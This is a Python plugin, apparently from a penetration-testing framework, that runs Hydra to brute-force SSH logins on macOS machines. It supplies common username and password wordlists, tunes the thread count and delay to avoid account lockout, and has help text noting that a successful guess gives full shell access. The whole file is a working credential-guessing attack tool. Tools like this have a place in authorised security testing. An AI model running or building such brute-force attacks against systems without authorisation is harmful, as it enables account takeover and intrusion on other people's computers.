#!/usr/bin/env python3
"""
souleyez.plugins.macos_ssh

macOS SSH brute force plugin using Hydra.
Attacks SSH on macOS systems with common credentials.
"""
import subprocess
import time
from typing import List

from .plugin_base import PluginBase
from souleyez.security.validation import validate_target, ValidationError

HELP = {
    "name": "macOS SSH Brute — Remote Login Attack",
    "description": (
        "Brute force SSH on macOS with common credentials.\n\n"
        "macOS Remote Login (SSH) uses local user accounts. Many Mac users:\n"
        "- Use simple passwords\n"
        "- Reuse their iCloud password\n"
        "- Have short names like 'admin', 'user'\n\n"
        "This plugin tests common macOS username/password combinations.\n\n"
        "Quick tips:\n"
        "- Remote Login must be enabled in macOS preferences\n"
        "- Use low threads to avoid lockout\n"
        "- macOS may have password policies\n"
        "- Success gives full shell access\n"
    ),
    "usage": "souleyez jobs enqueue macos_ssh <target>",
    "examples": [
        "souleyez jobs enqueue macos_ssh 192.168.1.100",
        "souleyez jobs enqueue macos_ssh 192.168.1.100 --args \"-l admin\"",
    ],
    "flags": [
        ["-l USER", "Single username to test"],
        ["-L FILE", "Username list file"],
        ["--port PORT", "SSH port (default: 22)"],
    ],
    "presets": [
        {"name": "Common Users", "args": [], "desc": "Test common macOS usernames"},
        {"name": "Admin Only", "args": ["-l", "admin"], "desc": "Test 'admin' user only"},
    ],
}


class MacOSSSHPlugin(PluginBase):
    name = "macOS SSH"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        import os
        locations = [
            os.path.join(os.path.dirname(__file__), '..', 'data', 'wordlists', filename),
            os.path.expanduser(f'~/.souleyez/wordlists/{filename}'),
            f'/usr/share/seclists/Passwords/{filename}',
        ]
        for loc in locations:
            if os.path.exists(loc):
                return os.path.abspath(loc)
        return filename

    def build_command(self, target: str, args: List[str] = None, label: str = "", log_path: str = None):
        """Build Hydra command for macOS SSH brute force."""
        args = args or []

        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, 'w') as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        # Parse args
        has_user = '-l' in args or '-L' in args
        port = '22'

        clean_args = []
        i = 0
        while i < len(args):
            if args[i] == '--port' and i + 1 < len(args):
                port = args[i + 1]
                i += 2
            else:
                clean_args.append(args[i])
                i += 1

        users = self._get_wordlist_path('macos_users.txt')
        passwords = self._get_wordlist_path('top100.txt')

        cmd = ['hydra']

        if not has_user:
            cmd.extend(['-L', users])

        cmd.extend(clean_args)
        cmd.extend([
            '-P', passwords,
            '-s', port,
            '-t', '1',  # Single thread for SSH
            '-w', '5',  # 5 second delay
            '-vV',
            '-f',
            target,
            'ssh'
        ])

        return {
            'cmd': cmd,
            'timeout': 3600
        }

    def run(self, target: str, args: List[str] = None, label: str = "", log_path: str = None) -> int:
        """Execute macOS SSH brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec['cmd']

        if log_path:
            with open(log_path, 'w') as f:
                f.write(f"# macOS SSH Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, 'a') as f:
                result = subprocess.run(
                    cmd,
                    stdout=f,
                    stderr=subprocess.STDOUT,
                    timeout=cmd_spec['timeout']
                )
            return result.returncode
        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, 'a') as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except Exception as e:
            if log_path:
                with open(log_path, 'a') as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = MacOSSSHPlugin()
